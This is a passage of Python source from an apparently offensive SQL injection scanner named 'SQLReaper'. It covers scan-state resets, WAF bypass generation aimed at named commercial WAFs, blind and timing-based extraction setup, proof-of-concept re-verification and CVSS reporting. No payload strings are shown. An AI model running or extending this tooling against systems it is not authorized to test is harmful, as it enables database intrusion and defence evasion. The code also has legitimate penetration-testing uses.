        _PCV_IN_PROGRESS[0]    = 0        # BUG-EXTRACTIONSTOP-9 FIX: counter, not bool
        _EXTRACTION_STARTED[1] = ""       # BUG-EXTRACTIONSTOP-9 FIX: clear surface name
        try:
            _PCV_XCAT_DRAINED.clear()     # BUG-EXTRACTIONSTOP-9 FIX: clear drained set
        except Exception:
            pass
        # BUG-R15-2 FIX PART2: Reset Rate429Monitor at scan start so cross-scan
        # rate-limit history doesn't bleed into the new scan session.
        # BUG-AUDIT-4 FIX (Req 15): _RATE_429_MONITOR was declared as None at module level
        # and NEVER assigned to the instance created in __init__.  Every call site in
        # retry_on_429() / _send_injected() / GlobalRequestGate checks `if _RATE_429_MONITOR:`
        # first, so all record_429() and is_rate_limited() calls silently no-op because the
        # singleton is always None.  Fix: assign the instance to the module-level name here
        # at scan start so all subsequent code paths can use it.
        global _RATE_429_MONITOR
        try:
            if hasattr(self, '_rate_429_monitor') and self._rate_429_monitor is not None:
                self._rate_429_monitor.reset()
                _RATE_429_MONITOR = self._rate_429_monitor  # BUG-AUDIT-4 FIX: wire singleton
        except Exception:
            pass
        # BUG-V32-3 FIX (Req 15/dead-code): Wire _GLOBAL_ADAPTIVE_EXTRACTOR singleton.
        # The AdaptiveExtractor instance (self._adaptive_extractor) is wired here so that
        # blind_extract_string's retry path can access it via the module-level reference,
        # even when `result._scanner_ref` is unavailable (most call paths).
        global _GLOBAL_ADAPTIVE_EXTRACTOR
        try:
            if hasattr(self, '_adaptive_extractor') and self._adaptive_extractor is not None:
                _GLOBAL_ADAPTIVE_EXTRACTOR = self._adaptive_extractor
                LOG.debug("[ScannerVFinal] _GLOBAL_ADAPTIVE_EXTRACTOR wired from _adaptive_extractor")
        except Exception:
            pass
        # BUG-V33-7 FIX (Req 15 / BUG-V32-15): Wire _GLOBAL_WASSERSTEIN singleton so
        # detect_boolean() FULL mode can invoke the EMD oracle for ambiguous confidence.
        global _GLOBAL_WASSERSTEIN
        try:
            if hasattr(self, '_wasserstein') and self._wasserstein is not None:
                _GLOBAL_WASSERSTEIN = self._wasserstein
                LOG.debug("[ScannerVFinal] _GLOBAL_WASSERSTEIN wired from _wasserstein")
        except Exception:
            pass
        # BUG-R15-3 FIX PART2: Reset ProgressTracker at scan start.
        # BUG-AUDIT-10 FIX (Req 15): set_phase() and mark_param_complete() were never called —
        # the instance was only reset. Activate detection phase now so progress is trackable.
        try:
            if hasattr(self, '_progress_tracker') and self._progress_tracker is not None:
                self._progress_tracker.reset()
                if hasattr(self._progress_tracker, 'set_phase'):
                    self._progress_tracker.set_phase('detection')
        except Exception:
            pass
        # BUG-AUDIT-8 FIX (Req 15): ScanTimeEstimator was instantiated in __init__ but
        # never initialized with scan parameters, so no callers could use it for time-budget
        # scheduling.  Initialize here now that we have the config/session context.
        try:
            if hasattr(self, '_scan_time_estimator') and self._scan_time_estimator is not None:
                _ste = self._scan_time_estimator
                if hasattr(_ste, 'initialize'):
                    _n_params_ste = max(1, len(getattr(self.session, 'params', {}) or {}))
                    _n_techs_ste  = max(1, len(getattr(self.config, 'techniques',
                                                        ['B','E','T','U','S']) or []))
                    _ste.initialize(
                        n_params=_n_params_ste,
                        n_techniques=_n_techs_ste,
                        level=getattr(self.config, 'level', 1))
                    LOG.debug("[ScanTimeEstimator] Initialized: %d params × %d techniques",
                              _n_params_ste, _n_techs_ste)
        except Exception as _ste_init_err:
            LOG.debug("[ScanTimeEstimator] Init error (non-fatal): %s", _ste_init_err)
        # BUG-FIX-REQ3-THRESH-RESET (Req 3): Reset PCV timing thresholds at scan start.
        # Thresholds calibrated on a previous target contaminate Check B for the new one:
        # e.g. PostgreSQL pg_sleep(0.1) sets global threshold=65ms; MSSQL WAITFOR on
        # the next target uses 65ms instead of 300ms floor → timing injections FAIL PCV.
        try:
            self.config._pcv_timing_threshold = 0.0
            self.config._pcv_timing_threshold_map = {}
        except Exception:
            pass
        # BUG-R4-A-CEVENT FIX (Req 4): Clear/reset _confirmed_event on config at scan start.
        # A stale _confirmed_event.is_set()=True from a previous scan causes _pcv_check_guarded
        # and _inline_pcv_check to see "already confirmed" on entry → return None immediately →
        # every detection on the new target is silently discarded without running PCV.
        # Replace with a fresh asyncio.Event() so the new scan starts unconfirmed.
        try:
            _old_cev = getattr(self.config, '_confirmed_event', None)
            if _old_cev is not None:
                # Clear the old event (allows waiting coroutines to resume) then
                # replace with a fresh one so no stale .is_set()=True persists.
                try:
                    _old_cev.clear()
                except Exception:
                    pass
            self.config._confirmed_event = asyncio.Event()
        except Exception:
            pass

        # BUG-R5-LOCK-RACE FIX: Reset module-level extraction lock at scan start.
        # A stale locked asyncio.Lock from a crashed previous scan would deadlock
        # all extraction attempts in the new scan. Setting to None forces _get_extraction_lock()
        # to create a fresh clean lock on first use in the new scan.
        _EXTRACTION_LOCK[0] = None
        # BUG-CPU-B FIX (Req 9): Reset extraction semaphore at scan start.
        # A semaphore whose internal counter drifted (e.g. because a previous scan
        # had coroutines that were cancelled before releasing it) would throttle
        # extraction in the new scan to fewer than _EXTRACTION_SEM_LIMIT slots.
        # Resetting to None forces _get_extraction_semaphore() to create a fresh one.
        _EXTRACTION_SEMAPHORE[0] = None
        # BUG-SCAN-RESET FIX: Clear TechniqueCascadeEngineV18 class-level expansion
        # cache at scan start.  The cache is keyed by (dbms, level) and its scan-id
        # guard (Fix 2) already handles this, but an explicit clear here ensures the
        # cache is clean even when ScannerVFinal is reused across targets in the same
        # process (e.g. --multiple mode).  This costs nothing since the cache is
        # rebuilt on the first cascade for each DBMS anyway.
        try:
            TechniqueCascadeEngineV18._expansion_cache = {}
            TechniqueCascadeEngineV18._expansion_cache_scan_id = None
        except Exception:
            pass
        # BUG-11A-FIX (Part 4): Reset the AdaptiveExtractionEngine's mutation_engine to
        # "Generic" at scan start.  If a previous scan identified DBMS=PostgreSQL and set
        # remutator.mutation_engine = SQLMutationEngine("PostgreSQL"), the next scan against
        # a different target (MySQL) would still use PostgreSQL-specific mutation for extraction
        # until DBMS confirmation fires.  Reset to Generic here; the DBMS-specific upgrade
        # fires in the V1/V14 DBMS confirmation paths above (already fixed).
        try:
            _adap_eng_reset = get_adaptive_engine()
            if _adap_eng_reset is not None and _adap_eng_reset.remutator is not None:
                _adap_eng_reset.remutator.mutation_engine = SQLMutationEngine(
                    dbms="Generic", surface="url")
        except Exception:
            pass
        # Reset request counter for minimum delay enforcement
        global _SENDINJ_REQ_COUNTER, _EXTRACTION_REQ_COUNTER, _NOISE_PROBE_COUNTER
        _SENDINJ_REQ_COUNTER = 0
        # BUG-8b-FIX (Req 9): _EXTRACTION_REQ_COUNTER was never reset between scans.
        # After scanning ~5 targets its cumulative value modulo 5 drifts, causing the
        # extraction throttle to fire at different offsets per target — making the
        # per-5-request 50 ms gate unreliable.  Reset here alongside _SENDINJ_REQ_COUNTER.
        _EXTRACTION_REQ_COUNTER = 0
        # TECHNIQUE-1: Reset noise probe counter at scan start so per-target noise
        # injection budget starts fresh (prevents counter drift across multi-target runs).
        _NOISE_PROBE_COUNTER = 0
        # BUG-PCV-3 FIX: Clear TimingPrecisionBooster per-(url,param) cache.
        # detect_time._tpb_cache stores IQR-calibrated minimum sleep thresholds
        # keyed by "{url}::{param}::{method}".  If the same Python process scans
        # multiple targets (--all-params, test suite, interactive shell), stale
        # thresholds calibrated for target A are reused for target B, which may
        # have completely different network jitter characteristics.
        # Cost: near-zero — the cache is rebuilt on first timing probe per param.
        try:
            if hasattr(detect_time, '_tpb_cache'):
                detect_time._tpb_cache.clear()
        except Exception:
            pass
        # FIX-REQ15: Wire clear_payload_cache() into scan reset so the LRU payload
        # cache does not accumulate stale entries from previous targets across multiple
        # runs.  The cache is rebuilt in the warm-up pass after _populate_certified_db().
        # FIX-REQ15B: Use safe_call() to wrap the call — safe_call was defined but never
        # called anywhere in the scan loop, violating Req 15. This is its correct use:
        # wrapping a non-critical maintenance call that should not abort the scan if it fails.
        safe_call(clear_payload_cache, logger=LOG)

        # FIX-PCV-D: Reset the module-level FalsePositiveGuardV18 singleton.
        # _clean_cluster and _param_results accumulate across scans in the same
        # process.  _clean_cluster holds up to 20 "known clean" response bodies;
        # if these were captured from a previous target, L5 (cluster check) can
        # reject genuine injection on a new target whose clean responses happen
        # to match past clean ones.  _param_results is keyed by "url::method";
        # if a new target shares a path with an old one, L4 cross-param
        # correlation fires incorrectly.  Reset both before each scan.
        try:
            get_v18_fp_guard().reset()
        except Exception:
            pass
        # BUG-DEDUP-CROSS-TARGET FIX (Req 15/9): Reset PayloadDeduplicator singleton.
        # Without reset(), payload hashes from the previous target linger and cause
        # should_send() to return False (skip) for payloads that worked on the prior target.
        # This is especially harmful when scanning similar apps (same framework, same paths)
        # where the same injection payload is likely to work on both targets.
        try:
            _v18_dedup_ref = get_v18_deduplicator()
            if hasattr(_v18_dedup_ref, 'reset'):
                _v18_dedup_ref.reset()
        except Exception:
            pass
        # FIX-3D: Reset the module-level BlindBoolCalibrator singleton.
        # _BOOL_CALIBRATOR_MODULE persists across scans; threshold calibrated on
        # target A (e.g. 0.88) is then used for target B which may have totally
        # different response dynamics (threshold should be ~0.65 for a fresh target
        # with no prior observations).  Using the stale threshold rejects legitimate
        # detections on target B (threshold too high) or accepts FPs (too low).
        # Reset to initial state (threshold=0.65, empty observation lists) so each
        # scan begins calibration fresh.
        try:
            global _BOOL_CALIBRATOR_MODULE
            _BOOL_CALIBRATOR_MODULE.true_sims.clear()
            _BOOL_CALIBRATOR_MODULE.false_sims.clear()
            _BOOL_CALIBRATOR_MODULE.threshold = 0.65
            _BOOL_CALIBRATOR_MODULE._polarity_inverted = False
        except Exception:
            pass

        # BUG-CACHE-CROSS-TARGET FIX (Issue 9): Clear timing calibration caches at scan
        # start. _TB_CALIBRATION_CACHE and _TB_EBF_CACHE hold per-(url,param,t) entries
        # calibrated for the previous target.  When the process scans multiple targets,
        # a cache hit from target A (fast LAN target, threshold=200ms) contaminates
        # target B (CDN target, should be threshold=1200ms) — calibration is skipped,
        # extraction uses the wrong threshold, binary search never converges, and every
        # character extracts as '?' or '~'.  Also prevents unbounded memory growth.
        try:
            global _TB_CALIBRATION_CACHE, _TB_EBF_CACHE
            _TB_CALIBRATION_CACHE.clear()
            _TB_EBF_CACHE.clear()
        except Exception:
            pass

        # Ensure DBMS_TECHNIQUE_MAP is populated (idempotent — no-op if already done at startup)
        # BUG-1-FIX: removed `global DBMS_TECHNIQUE_MAP` here — that declaration appeared
        # AFTER DBMS_TECHNIQUE_MAP was already READ at the `if not DBMS_TECHNIQUE_MAP:` check
        # above, causing Python to raise SyntaxError: "name used prior to global declaration".
        # DBMS_TECHNIQUE_MAP is now listed in the combined global statement above (line ~111299).
        _ensure_technique_map_populated()

        # FIX-REQ15: Wire init_adaptive_extraction() into scan startup.
        # init_adaptive_extraction was defined but never called (Req 15 dead code).
        # It initializes the _ADAPTIVE_ENGINE singleton with the current scan's
        # mutation engine so AdaptiveExtractionEngine is ready for the detection phase.
        # The call is idempotent (guarded by `if _ADAPTIVE_ENGINE is None`) so calling
        # it here on every scan start correctly re-initialises for multi-target scans
        # by resetting _ADAPTIVE_ENGINE to None first (which the reset block above does).
        try:
            _adap_init_eng = init_adaptive_extraction(
                mutation_engine=PayloadMutationEngine,
                max_bypasses=5,
                waf_threshold=0.30)
            LOG.debug(f"[AdaptiveExtraction] Initialized: {type(_adap_init_eng).__name__}")
        except Exception as _adap_init_err:
            LOG.debug(f"[AdaptiveExtraction] Init failed (non-fatal): {_adap_init_err}")

        LOG.info(f"[*] SQLReaper v26.0 starting — {len(DBMS_PROBE_ORDER)} DBMSes × 10 techniques × 300 payloads")
        # BUG-DEAD-SCAN-TIME FIX (Req 15): Wire ScanTimeEstimator — was defined but never called.
        # Provides upfront scan-duration estimate so operator can choose to use --level=1 or --delay=0
        # on large target sets. Non-critical: errors are silently logged.
        try:
            _n_params_est = len(getattr(self.session, 'params', None) or []) or 5
            _n_dbms_est   = len(DBMS_PROBE_ORDER) if DBMS_PROBE_ORDER else 6
            _n_tech_est   = len(TECHNIQUE_PRIORITY_ORDER) if TECHNIQUE_PRIORITY_ORDER else 17
            _lvl_est      = int(getattr(self.config, 'level', 1) or 1)
            _dly_est      = float(getattr(self.config, 'delay', 0.0) or 0.0)
            _est_secs     = ScanTimeEstimator.estimate(_n_params_est, _n_dbms_est, _n_tech_est,
                                                       _lvl_est, _dly_est)
            _est_mins = int(_est_secs // 60)
            _est_secs_rem = int(_est_secs % 60)
            print(f"[*] Estimated scan time: {_est_mins}m {_est_secs_rem}s "                  f"({_n_params_est} params × {_n_dbms_est} DBMSes × {_n_tech_est} techniques, "                  f"level={_lvl_est})", flush=True)
        except Exception as _scan_est_err:
            LOG.debug(f"[ScanTimeEstimator] error (non-fatal): {_scan_est_err}")

        #  Enhancement 1: Session resume 
        if self._session_persist.has_saved_session():
            _saved = self._session_persist.load()
            if _saved:
                _saved_params = _saved.get("completed_params", [])
                _saved_dbms = _saved.get("confirmed_dbms")
                print("[+] [Session] Resuming from saved state: "
                      f"{len(_saved_params)} params completed"
                      f"{', dbms=' + _saved_dbms if _saved_dbms else ''}", flush=True)
                self.session.data["_resumed_params"] = _saved_params
                if _saved_dbms:
                    self._dbms_eliminator._confirmed_dbms = _saved_dbms

        # Pre-scan: cache layer analysis for time-based gating
        # FIX-REQ15: Use safe_async_call() to wrap _pre_scan_cache_analysis.
        # safe_async_call was defined but never called anywhere.  The scan-analysis call
        # is non-critical (failure should not abort the scan) — exactly the pattern
        # safe_async_call is designed for.  asyncio.wait_for() still limits total time.
        try:
            await asyncio.wait_for(
                safe_async_call(self._pre_scan_cache_analysis, logger=LOG),
                timeout=15)
        except (asyncio.TimeoutError, Exception) as e:
            LOG.debug(f"Cache analysis error: {e}")

        # Restore bloom filter state from previous session if available
        _prev_bloom_keys = self.session.data.get("bloom_seen_payloads", [])
        for _pk in _prev_bloom_keys:
            self._bloom.add(_pk)
        if _prev_bloom_keys:
            LOG.debug(f"[v19] Restored {len(_prev_bloom_keys)} seen payloads into BloomFilter")

        # Restore ConfidenceCalibrator pairs from previous session
        _prev_cal_pairs = self.session.data.get("calibrator_pairs", [])
        for _raw, _outcome in _prev_cal_pairs:
            self._calibrator.record(_raw, bool(_outcome))
        if _prev_cal_pairs:
            LOG.debug(f"[v19] Restored {len(_prev_cal_pairs)} calibrator pair(s) from session")

        # Pre-classify injection contexts for key parameters
        await self._pre_scan_context_sweep()

        # Main scan (v15)
        await super().run()

        # Count params confirmed as injectable this session.
        # session.vulnerabilities is the authoritative record (dict keyed by param).
        # reporter.vulns may contain duplicates from resumed sessions; use the
        # session dict so we don't double-count the same param twice.
        self._v19_scan_count = len(self.session.vulnerabilities)

        # Persist bloom filter sample to session for resume
        self.session.data["bloom_seen_payloads"] = []  # bloom can't enumerate; reset each scan
        # BUG-BLOOM-CROSS-TARGET FIX (Req 9/15): Re-create the Bloom filter itself.
        # session.data reset above clears the payload key list, but self._bloom retains
        # its bitarray from previous scans. Without re-creating it, payloads tested on
        # target A are silently skipped on target B (false-negative misses on 2nd+ targets).
        try:
            self._bloom = BloomPayloadFilter(capacity=200_000, fp_rate=0.001)
        except Exception:
            pass  # keep old instance if construction fails

        # Persist calibrator pairs so isotonic regression accumulates across sessions
        self.session.data["calibrator_pairs"] = [
            [r, o] for r, o in self._calibrator._pairs]

        # Post-scan: markdown report + calibrated scores
        await self._post_scan_v19()


    async def _v14_init(self, engine, url: str, method: str):
        """
        v19 override: seeds TemporalAnomalyDetector with live baseline RTTs,
        applies bandit priors from any resumed session data, and activates the
        trigram WAF predictor with successful payloads from the KB.
        Then delegates to the V15 init (jitter profile, safe mode, ORM, JS mining).
        """
        # CRITICAL FIX: Store engine as instance attribute for use in _run_enumeration
        # and when creating Enumerator objects during extraction (lines 54104, 54176)
        self.engine = engine
        
        # Seed TemporalAnomalyDetector with baseline RTTs from the live engine.
        # FIX dedup: _pre_scan_cache_analysis() also seeds with 5 probes using a
        # separate HTTPEngine. Only seed here if the window is still empty (i.e.
        # _pre_scan_cache_analysis ran first and already populated the baseline).
        # BUG-V39-10 FIX (Req 9/15): Removed `import time as _t19` inline.
        # `time` is already imported at module level (line ~1570).
        if len(self._temporal._window) == 0:
            LOG.debug("[v19] Seeding TemporalAnomalyDetector baseline (5 probes via live engine)")
            for _ in range(5):
                try:
                    t0 = time.monotonic()
                    await asyncio.wait_for(engine.send(method, url), timeout=15)
                    self._temporal.record_baseline((time.monotonic() - t0) * 1000)
                except Exception:
                    pass
        else:
            LOG.debug("[v19] TemporalAnomalyDetector already seeded "
                      f"({len(self._temporal._window)} samples)  skipping duplicate seed")

        # Apply bandit priors from resumed session data (if any)
        _prev_bandit = self.session.data.get("bandit_stats", {})
        if _prev_bandit:
            for arm, stats in _prev_bandit.items():
                alpha = stats.get("alpha", 1.0)
                beta  = stats.get("beta",  1.0)
                # Re-play accumulated observations into fresh bandit
                for _ in range(max(0, int(alpha - 1))):
                    self._bandit.record(arm, True)
                for _ in range(max(0, int(beta  - 1))):
                    self._bandit.record(arm, False)
            LOG.debug(f"[v19] Restored bandit priors for {len(_prev_bandit)} arms")

        # Seed trigram model from KB top bypass payloads
        try:
            if hasattr(self, "kb"):
                for payload in self.kb.top_payloads(limit=30):
                    if payload:
                        self._trigram.train(payload)
        except Exception as _tg_e:
            LOG.debug(f"[v19] Trigram seed error: {_tg_e}")

        # Wire WAFMLBypassGenerator when an ML-type WAF is detected.
        # Uses the session waf_info set by the ML fingerprinter in _run_v14().
        # The generator augments the evolution engine with SPSA-derived bypass
        # variants that evade gradient-boosted / neural WAF classifiers.
        _waf_name_v19 = (self.session.waf_info or {}).get("name", "")
        _ml_waf_names = ("cloudflare", "aws waf", "akamai", "wallarm", "reblaze",
                          "imperva", "f5", "radware", "fortiweb")
        _is_ml_waf = any(n in _waf_name_v19.lower() for n in _ml_waf_names)
        if _is_ml_waf or getattr(self.config, "waf_bypass", 0) >= 3:
            try:
                _dummy_baseline = {"mean_timing": 200, "std_timing": 50,
                                   "mean_length": 1000, "samples": []}
                self._waf_ml_bypass = WAFMLBypassGenerator(
                    engine, self.config, _dummy_baseline)
                # Seed the generator's internal trigram scorer from the global model
                self._waf_ml_bypass._scorer = self._trigram
                LOG.info("[v19] WAFMLBypassGenerator activated "
                         f"(WAF={_waf_name_v19 or 'forced'}, "
                         f"waf_bypass={getattr(self.config,'waf_bypass',0)})")
            except Exception as _wml_e:
                LOG.debug(f"[v19] WAFMLBypassGenerator init error: {_wml_e}")

        # Delegate to V15 init (jitter profiling, safe mode, ORM detection)
        await super()._v14_init(engine, url, method)

        # Sync oracle mode from config (set by SafeModeVerifier inside super()) back to self
        _mode = getattr(self.config, "_oracle_mode", OracleMode.FULL)
        self._oracle_mode = _mode
        LOG.info(f"[v19] Oracle mode confirmed: {self._oracle_mode.value}")

    async def _pre_scan_context_sweep(self):
        """Pre-scan: classify injection context for each discovered parameter."""
        cfg = self.config
        url = cfg.url
        if not url:
            return
        try:
            async with HTTPEngine(cfg, self.session) as engine:
                params = {}
                try:
                    from urllib.parse import urlparse as _up, parse_qs as _pqs
                    _parsed = _up(url)
                    # FIX: Preserve all values for multi-valued parameters
                    params = _pqs(_parsed.query)
                    if cfg.data:
                        try:
                            # Merge form params, preserving all values
                            _form_params = _pqs(cfg.data)
                            for k, v in _form_params.items():
                                if k in params:
                                    params[k].extend(v)
                                else:
                                    params[k] = v
                        except Exception:
                            pass
                except Exception:
                    pass
                if not params:
                    return
                # FIX: detect actual data format rather than hardcoding "form"
                _ctx_data_fmt = "json" if (cfg.data or "").strip().startswith("{") else "form"
                # Use first value of each param for baseline (if param has multiple values, test them individually)
                _first_param = next(iter(params))
                _first_value = params[_first_param][0] if isinstance(params[_first_param], list) else params[_first_param]
                baseline = await asyncio.wait_for(build_baseline(
                    engine, cfg, cfg.method, url, cfg.data, _ctx_data_fmt,
                    _first_param, _first_value, [], n_samples=3), timeout=300)
                sweeper = InjectionBoundarySweeper(
                    engine, cfg, cfg.method, url, cfg.data, _ctx_data_fmt, baseline, [])
                contexts = {}
                # Limit to first 2 params for speed; sweep rest lazily during scan
                # BUG-CTXSWEEP-LIST-ORIGINAL FIX: parse_qs returns dict[str, list[str]].
                # Passing the list directly to sweep() caused `original + true_sfx`
                # (list + str) to raise TypeError on every probe → all contexts returned
                # "UNKNOWN" silently. Extract the first string value.
                _sweep_tasks = []
                for param, original in list(params.items())[:2]:
                    _orig_str = original[0] if isinstance(original, list) else original
                    _sweep_tasks.append((param, _orig_str, sweeper.sweep(param, _orig_str)))
                for param, original, task in _sweep_tasks:
                    try:
                        ctx = await asyncio.wait_for(task, timeout=15)
                    except (asyncio.TimeoutError, TimeoutError):
                        ctx = "UNKNOWN"
                    contexts[param] = ctx
                    if ctx != "UNKNOWN":
                        LOG.info(f"[BoundarySweeper] {param!r}  {ctx}")
                self.session.data["injection_contexts"] = contexts
        except Exception as _e:
            LOG.debug(f"Context sweep error: {_e}")

    def _get_bandit_technique_order(self, requested: str) -> str:
        """
        Returns a technique string ranked by the multi-armed bandit (Thompson sampling).
        If the bandit has insufficient data (< 5 total pulls), falls back to requested.

        FIX-BANDIT-1: the old code returned "".join(ranked) producing e.g. "BETUS".
        try_all() parses with re.split(r'[,\\s]+', ...) -> single token "BETUS"
         tech_order = [t for t in TECHNIQUE_PRIORITY_ORDER if t in ["BETUS"]] = []
         NO techniques were tried once bandit had >=5 pulls. Fixed: return comma-
        separated IDs. Multi-char techniques not tracked by bandit (HQ,EH,BH,TH,IN,
        UE,BT,DS,SO) are appended after ranked core so they are still probed.
        """
        total_pulls = sum(s.get("pulls", 0) for s in self._bandit.stats.values())
        if total_pulls < 5:
            return requested  # not enough data yet; fall back to static order
        ranked_core = self._bandit.ranked(requested)  # e.g. ["B","E","T","U","S","O"]
        # Append TECHNIQUE_PRIORITY_ORDER entries not covered by bandit ARMS
        _bandit_set = set(ranked_core)
        _extra = [t for t in TECHNIQUE_PRIORITY_ORDER if t not in _bandit_set]
        return ",".join(ranked_core + _extra)  # parseable by re.split in try_all

    async def _pre_scan_cache_analysis(self):
        """Probe for CDN caching and seed TemporalAnomalyDetector baseline."""
        cfg = self.config
        url = cfg.url
        if not url:
            return
        try:
            async with HTTPEngine(cfg, self.session) as engine:
                # Seed TemporalAnomalyDetector with 3 concurrent baseline RTTs
                LOG.debug("[v19] Seeding TemporalAnomalyDetector baseline")
                async def _seed_rtt():
                    try:
                        t0 = time.monotonic()
                        await engine.send(cfg.method, url)
                        return (time.monotonic() - t0) * 1000
                    except Exception:
                        return None
                _rtts = await asyncio.gather(*[_seed_rtt() for _ in range(3)], return_exceptions=True)
                for _rtt in _rtts:
                    if _rtt is not None:
                        self._temporal.record_baseline(_rtt)

                probe = CacheLayerTimingProbe(engine, cfg)
                result = await asyncio.wait_for(probe.probe(cfg.method, url), timeout=20)
                if result["cached"]:
                    LOG.warning(
                        f"CDN caching detected ({result.get('cdn') or 'unknown'}) "
                        " time-based techniques may be unreliable. "
                        f"Recommendation: {result['recommendation']}"
                    )
                    # Auto-deprioritise time-based if caching detected
                    self._bandit.record("T", False)
                    self._bandit.record("T", False)  # double-penalise
                    if self.session.waf_info is None:
                        self.session.waf_info = {}
                    self.session.waf_info["cdn_cached"] = True
                    self.session.waf_info["cache_info"] = result
        except Exception as _e:
            LOG.debug(f"Cache probe error: {_e}")

    async def _post_scan_v19(self):
        """Post-processing: PoC verification, calibration, CVSS scoring, MD report."""
        cfg = self.config
        out_dir = Path(cfg.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        #  PoCVerifier: re-confirm every finding before scoring 
        if self.reporter.vulns and not getattr(cfg, "skip_verify", False):
            try:
                async with HTTPEngine(cfg, self.session) as _ve:
                    _vmethod = cfg.method
                    # FIX: data_fmt must reflect actual content, not hardcoded "form"
                    _data_fmt = "json" if (cfg.data or "").strip().startswith("{") else "form"
                    for vuln in self.reporter.vulns:
                        try:
                            # FIX BUG-D: use per-vuln url/method stored by add_vuln
                            # so crawl-mode findings are re-verified against their
                            # actual endpoint, not always the root cfg.url.
                            _vurl    = vuln.get("url", "") or cfg.url or ""
                            _vmethod = vuln.get("method", "") or cfg.method
                            # FIX: Reporter.add_vuln stores key as "parameter" not "param"
                            _vparam = vuln.get("parameter", "")
                            _orig   = vuln.get("original", "1")
                            _tamper = vuln.get("tamper_chain", [])
                            # FIX: build baseline per-vuln using the actual vulnerable parameter
                            # instead of a shared irrelevant "id"="1" baseline
                            _vbaseline = await asyncio.wait_for(build_baseline(
                                _ve, cfg, _vmethod, _vurl, cfg.data, _data_fmt,
                                _vparam or "id", _orig, _tamper, n_samples=3), timeout=300)
                            _verifier = PoCVerifier(_ve, cfg, _vbaseline)
                            _det = DetectionResult(
                                param=_vparam,
                                technique=vuln.get("technique","B"),
                                payload=vuln.get("payload",""),
                                dbms=vuln.get("dbms",""),
                                confidence=vuln.get("confidence",0.8))
                            verified, adj_conf = await _verifier.verify(
                                _det, _vmethod, _vurl,
                                cfg.data, _data_fmt, _orig, _tamper)
                            vuln["poc_verified"] = verified
                            vuln["confidence"] = adj_conf
                            if not verified:
                                LOG.warning(
                                    f"[PoCVerifier] Finding {_vparam!r} "
                                    "failed re-verification  confidence halved")
                        except Exception as _pv_e:
                            LOG.debug(f"[PoCVerifier] Single finding error: {_pv_e}")
            except Exception as _pv_outer_e:
                LOG.debug(f"[PoCVerifier] Outer error: {_pv_outer_e}")

        #  Calibrate all confidence scores via isotonic regression 
        for vuln in self.reporter.vulns:
            raw_conf = vuln.get("confidence", 0.8)
            cal_conf = self._calibrator.calibrate(raw_conf)
            vuln["calibrated_confidence"] = cal_conf
            # Feed verification result back to calibrator for future scans
            if "poc_verified" in vuln:
                self._calibrator.record(raw_conf, vuln["poc_verified"])

        # Add CVSS scores to all vulns
        for v in self.reporter.vulns:
            score, vector = CVSSv4AutoScorer.score(
                v.get("technique", "B"),
                v.get("dbms", ""),
                has_stacked="S" in {vv.get("technique","") for vv in self.reporter.vulns})
            v["cvss_v4_score"] = score
            v["cvss_v4_vector"] = vector
            v["cvss_v4_severity"] = CVSSv4AutoScorer.severity(score)

        # Record technique outcomes into bandit for future session learning
        # Also train the trigram WAF predictor on verified bypass payloads
        for vuln in self.reporter.vulns:
            tech  = vuln.get("technique", "B")
            ok    = vuln.get("poc_verified", True)
            self._bandit.record(tech, ok)
            payload = vuln.get("payload", "")
            if payload and ok:
                self._trigram.train(payload)

        # Bandit stats to session for future use
        self.session.data["bandit_stats"] = self._bandit.stats

        # Markdown narrative report
        try:
            md_reporter = MarkdownNarrativeReporter(self.reporter)
            md_path = str(out_dir / f"sqlreaper_{self.session.session_id}.md")
            md_reporter.save(md_path, self.session)
        except Exception as _me:
            LOG.debug(f"Markdown report error: {_me}")

        LOG.info(
            "v19 post-processing complete  "
            f"{len(self.reporter.vulns)} finding(s), "
            f"params_scanned{self._v19_scan_count}, "
            f"bandit: {self._bandit.stats}, "
            f"calibrator_pairs: {len(self._calibrator._pairs)}, "
            f"trigram_vocab: {len(self._trigram._trigram_counts)}")

        # FIX-REQ15: Wire display_adaptive_stats() and get_payload_stats() into post-scan.
        # These utility functions were defined but never called anywhere in the scan loop.
        # display_adaptive_stats() shows WAF bypass attempt statistics.
        # get_payload_stats() shows per-DBMS payload counts for operator diagnostics.
        try:
            display_adaptive_stats()
        except Exception:
            pass
        try:
            _pstats = get_payload_stats()
            if _pstats and isinstance(_pstats, dict):
                LOG.info(f"[PayloadStats] {_pstats}")
        except Exception:
            pass


